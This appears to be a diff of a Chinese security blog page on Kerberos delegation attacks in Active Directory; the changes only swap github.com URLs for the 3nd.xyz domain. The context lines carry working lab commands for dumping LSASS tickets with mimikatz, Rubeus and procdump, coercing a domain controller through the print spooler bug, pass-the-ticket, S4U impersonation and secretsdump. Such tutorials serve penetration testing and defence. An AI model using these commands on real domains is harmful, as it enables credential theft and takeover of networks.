@@ -4,10 +4,10 @@
   <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>域渗透中的 Kerberos 委派攻击 | 3ND</title>
-<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link rel="shortcut icon" href="https://3nd.xyz/favicon.ico?v=1627821697412">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="域渗透中的 Kerberos 委派攻击 | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://3nd.xyz/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="域渗透中的 Kerberos 委派攻击 | 3ND - Atom Feed" href="https://3nd.xyz/atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -24,8 +24,8 @@
   <div class="main">
     <div class="main-content">
       <div class="site-header">
-  <a href="https://github.com/inspiringz/inspiringz.github.io">
-  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  <a href="https://3nd.xyz">
+  <img class="avatar" src="https://3nd.xyz/images/avatar.png?v=1627821697412" alt="">
   </a>
   <h1 class="site-title">
     3ND
@@ -94,15 +94,15 @@
               <span class="page-view" key="20210118141019" title="域渗透中的 Kerberos 委派攻击">
               </span>
               
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ad/" class="post-tag">
+                <a href="https://3nd.xyz/tag/ad/" class="post-tag">
                   # AD
                 </a>
                 
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/kerberos/" class="post-tag">
+                <a href="https://3nd.xyz/tag/kerberos/" class="post-tag">
                   # Kerberos
                 </a>
                 
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/delegation/" class="post-tag">
+                <a href="https://3nd.xyz/tag/delegation/" class="post-tag">
                   # Delegation
                 </a>
                 
@@ -114,7 +114,7 @@
 <h2 id="0x01-非约束委派">0x01 非约束委派</h2>
 <h3 id="unconstrained-delegation">Unconstrained Delegation</h3>
 <p><strong>在托管 TGS-REQ 中引用的服务主体名称（SPN) 中指定的服务的服务器上启用 Kerberos 非约束委派时，DC 将用户的 TGT 副本放入服务票据中。当用户的服务票据（TGS 票据）提供给服务器来访问服务时，服务器将打开 TGS 票据，将用户的 TGT 放入本地安全认证子系统服务 LSASS，以供以后使用，此时应用服务器可以无限制地模拟用户身份。</strong></p>
-<figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-18-15-02-21.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://3nd.xyz/post-images/move/2021-01-18-15-02-21.png" alt="" loading="lazy"></figure>
 <p><strong>1a.</strong> 用户密码转换为 NTLM 哈希，时间戳使用哈希进行加密，并作为身份验证票据&amp;票据授予票据（TGT）请求（AS-REQ）中的身份验证器发送给 KDC。</p>
 <p><strong>1b.</strong> 域控制器（KDC）检查用户信息（登录限制，组成员身份等）并创建票据授予票据（TGT）。</p>
 <p><strong>2.</strong> 票据授予票据 TGT 加密、签名，并交付给用户（AS-REP）。只有域中的 Kerberos 服务（KRBTGT）才能打开和读取 TGT 数据。</p>
@@ -151,7 +151,7 @@ winrm e winrm/config/listener
 <p>3. DC 以 <code>administrator</code> 的身份通过 WinRM 服务远程连接 IIS-8:</p>
 <pre><code class="language-sh">Enter-PSSession -ComputerName iis-8
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-18-18-52-56.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://3nd.xyz/post-images/move/2021-01-18-18-52-56.png" alt="" loading="lazy"></figure>
 <p>4. 此时域管理员的 TGT 已经缓存在 IIS-8 LSASS，通过 mimikatz/Rubeus 可导出：</p>
 <pre><code class="language-sh"># mimikatz
 privilege::debug 
@@ -160,30 +160,30 @@ sekurlsa::tickets /export
 rubeus.exe triage
 rubeus.exe dump # [IO.File]::WriteAllBytes(&quot;ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;aa...&quot;))
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-20-11-41-02.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://3nd.xyz/post-images/move/2021-01-20-11-41-02.png" alt="" loading="lazy"></figure>
 <p>测试当前无权限访问 DC 的 cifs 服务：</p>
-<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-20-11-43-27.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://3nd.xyz/post-images/move/2021-01-20-11-43-27.png" alt="" loading="lazy"></figure>
 <pre><code class="language-sh">mimikatz.exe &quot;kerberos::ptt file.kirbi&quot; &quot;exit&quot;
 rubeus.exe ptt /ticket:file.kirbi
 </code></pre>
 <p>导入 DC administrator tgt 票据后可成功访问：</p>
-<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-20-15-04-11.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://3nd.xyz/post-images/move/2021-01-20-15-04-11.png" alt="" loading="lazy"></figure>
 <p>Procdump + mimikatz:</p>
 <pre><code class="language-sh">procdump64.exe -accepteula -ma lsass.exe
 mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::tickets /export&quot; &quot;exit&quot;
 </code></pre>
 <h3 id="dc-print-bug">&amp; DC Print Bug</h3>
 <p><code>PrintBug</code>: Windows 打印系统远程协议（<code>MS-RPRN</code>）中的一种旧的但是默认启用的方法 <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>强制任何运行了 <code>Spooler</code> 服务的计算机以通过<code>Kerberos</code> 或 <code>NTLM</code> 对攻击者选择的目标进行身份验证。任何经过身份验证的域用户都可以远程连接到 DC 的打印服务器（后台打印程序服务, Spooler Service）并请求更新新的打印作业，DC 将立即测试该连接，从而暴露 DC 计算机帐户的凭据（因为后台打印程序为 SYSTEM 拥有）。</p>
-<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-20-16-26-11.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://3nd.xyz/post-images/move/2021-01-20-16-26-11.png" alt="" loading="lazy"></figure>
 <p>攻击者向 DC(运行后台打印程序服务,Print Spooler Service) 发送 RpcRemoteFindFirstPrinterChangeNotification 请求，DC 收到后立即向攻击者所控制的一台 <strong>主机账户开启了非约束委派</strong> 的域内机器发起身份认证，攻击者可在非约束委派机器的 LSASS 进程中获取到 DC 主机账户的 TGT 票据。</p>
 <p><a href="https://github.com/leftp/SpoolSamplerNET">SpoolSamplerNET</a> 请求 DC Spooler Service：</p>
 <pre><code class="language-sh">SpoolSamplerNET.exe win10.ins.z 2012dc.ins.z
 </code></pre>
-<figure data-type="image" tabindex="7"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-20-17-17-53.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://3nd.xyz/post-images/move/2021-01-20-17-17-53.png" alt="" loading="lazy"></figure>
 <p>非约束委派机器上 Rubeus 成功捕获到 DC 机器用户 2012dc$ 的 tgt 票据：</p>
 <pre><code class="language-sh">.\Rubeus.exe monitor /interval:1 /filteruser:2012dc$
 </code></pre>
-<figure data-type="image" tabindex="8"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-20-17-18-37.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://3nd.xyz/post-images/move/2021-01-20-17-18-37.png" alt="" loading="lazy"></figure>
 <p>转换 Base64 TGT 为 kirbi 票据文件，并通过 Rubeus 导入：</p>
 <pre><code class="language-sh">[IO.File]::WriteAllBytes(&quot;ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;aa...&quot;))
 .\Rubeus.exe ptt /ticket:ticket.kirbi
@@ -226,7 +226,7 @@ DCSyncer-x64.exe
 </li>
 </ul>
 <p>不同于允许委派所有服务的非约束委派，约束委派的目的是在模拟用户的同时，限制委派机器/帐户对特定服务的访问。</p>
-<figure data-type="image" tabindex="9"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-20-18-29-35.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://3nd.xyz/post-images/move/2021-01-20-18-29-35.png" alt="" loading="lazy"></figure>
 <p><strong>S4U2self</strong>：</p>
 <p>(1) 用户向 service1 发送请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。</p>
 <p>(2) 通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。</p>
@@ -298,13 +298,13 @@ Rubeus.exe ptt /ticket:TGS_administrator@ins.z@INS.Z_cifs~win7.ins.z@INS.Z.kirbi
                5 个目录 52,403,658,752 可用字节
 </code></pre>
 <p>委派过程分析：</p>
-<figure data-type="image" tabindex="10"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-21-15-51-26.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://3nd.xyz/post-images/move/2021-01-21-15-51-26.png" alt="" loading="lazy"></figure>
 <p>1. <code>AS 认证服务器交换</code> IIS-8$ 向 KDC 申请票据授予票据 TGT：</p>
-<figure data-type="image" tabindex="11"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-21-15-56-02.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://3nd.xyz/post-images/move/2021-01-21-15-56-02.png" alt="" loading="lazy"></figure>
 <p>2. <code>S4U2self</code> 通过步骤 1 获取的票据授予票据 TGT 来发送 S4U2self 请求，以 <code>ins\administrator</code> 身份向 TGS 票据许可服务器申请访问自身的服务票据授予服务 TGS 票据。</p>
-<figure data-type="image" tabindex="12"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-21-17-23-05.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://3nd.xyz/post-images/move/2021-01-21-17-23-05.png" alt="" loading="lazy"></figure>
 <p>3. <code>S4U2proxy</code> 附带上步骤 2 获取的 TGS 票据向 DC 发起 S4U2proxy 请求，以 <code>ins\administrator</code> 身份向 TGS 票据许可服务器申请访问 Win7 cifs 服务票据。</p>
-<figure data-type="image" tabindex="13"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-21-17-30-11.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://3nd.xyz/post-images/move/2021-01-21-17-30-11.png" alt="" loading="lazy"></figure>
 <p>kekeo:</p>
 <pre><code class="language-sh">tgt::ask /user:IIS-8$ /domain:ins.z /ntlm:bd3d734cdaec88d806c2f8458eb6c357
 kerberos::ptt TGT_IIS-8$@INS.Z_krbtgt~ins.z@INS.Z.kirbi
@@ -326,11 +326,11 @@ Rubeus.exe ptt /ticket:TGS_administrator_HOST_HOST-win7.ins.z.kirbi
 Rubeus.exe ptt /ticket:TGS_administrator_HOST_HTTP-win7.ins.z.kirbi
 </code></pre>
 <p>导入与约束委派允许的服务所在服务器相对应的 HOST 服务票据 + HTTP 服务票据，即可伪装为域管用户 administrator 通过 WinRM 管理远程主机。</p>
-<figure data-type="image" tabindex="14"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-22-11-41-58.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://3nd.xyz/post-images/move/2021-01-22-11-41-58.png" alt="" loading="lazy"></figure>
 <pre><code class="language-sh">winrs -r:win7.ins.z &quot;ipconfig&quot;(/cmd)
 </code></pre>
-<figure data-type="image" tabindex="15"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-22-11-25-39.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="16"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-22-11-40-49.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://3nd.xyz/post-images/move/2021-01-22-11-25-39.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://3nd.xyz/post-images/move/2021-01-22-11-40-49.png" alt="" loading="lazy"></figure>
 <blockquote>
 <p>WinRM 代表 Windows 远程管理，是一种允许管理员远程执行系统管理任务的服务。通过 HTTP（5985）或 HTTPS SOAP（5986）执行通信，默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证。使用此服务需要管理员级别凭据。</p>
 </blockquote>
@@ -357,7 +357,7 @@ secretsdump.exe -no-pass -k 2012dc.ins.z
 <h3 id="rbcd">RBCD</h3>
 <p>微软在 Windows Server 2012 中新加入了基于 kerberos 资源的约束委派(rbcd)，与传统的约束委派相比，它不再需要域管理员对其进行配置，可以直接在机器账户上配置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性来设置基于资源的约束委派。此属性的作用是控制哪些用户可以模拟成域内任意用户，然后向该计算机进行身份验证。</p>
 <p>基于资源的约束委派与约束委派相似，不同之处在于约束委派赋予 <strong>服务(机器)账号/对象</strong> 权限去 <strong>模拟任意用户访问特定资源服务</strong>，而基于资源的约束委派<strong>对资源对象设置谁能代表(任意)用户来访问它</strong>，资源对象本身可以为自己配置资源委派信任关系，决定信任对象。</p>
-<figure data-type="image" tabindex="17"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2021-01-22-18-19-41.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://3nd.xyz/post-images/move/2021-01-22-18-19-41.png" alt="" loading="lazy"></figure>
 <p>在这种情况下，受约束的资源对象将具有一个名为 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 的属性，其值为可以模拟其他任何用户的服务账户名。</p>
 <p>此外基于资源的约束委派与其他委派形式有个重要区别是，任何具有<strong>计算机帐户写权限（GenericAll/GenericWrite/WriteDacl/WriteProperty/etc）的任何用户都可以设置</strong> <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性，在其他形式的委派中，此类操作需要域管理员特权才能完成。</p>
 <p>事实上，在约束委派 <code>S4U2Self</code> 过程中，服务账户（有 SPN）可以在 <code>userAccountControl</code> 中无 <code>TrustedToAuthForDelegation</code> 标识的情况下，代表任意其他用户获取自身服务的 TGS 票据，但只有在包含 <code>TrustedToAuthForDelegation</code> 位时，返回的 TGS 票据才是可转发的 <code>Forwardable</code>。</p>
@@ -438,7 +438,7 @@ secretsdump.exe -no-pass -k 2012dc.ins.z
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter;text-align: left;">上一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2021-02-08-java-security-learning/">
+              <a href="https://3nd.xyz/post/2021-02-08-java-security-learning/">
                 <h3 class="post-title" style="text-align: left;">
                   Java Security Study Notes (Basic)
                 </h3>
@@ -449,7 +449,7 @@ secretsdump.exe -no-pass -k 2012dc.ins.z
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter; text-align: right;">下一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2020-9-30-fluent-py-study-notes/">
+              <a href="https://3nd.xyz/post/2020-9-30-fluent-py-study-notes/">
                 <h3 class="post-title" style="
                 text-align: right;">
                   Fluent Python Study Notes
@@ -463,7 +463,7 @@ secretsdump.exe -no-pass -k 2012dc.ins.z
 
                                 <div class="site-footer">
   
-  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+  <a class="rss" href="https://3nd.xyz/atom.xml" target="_blank">
     <i class="ri-rss-line"></i> RSS
   </a>
 </div>
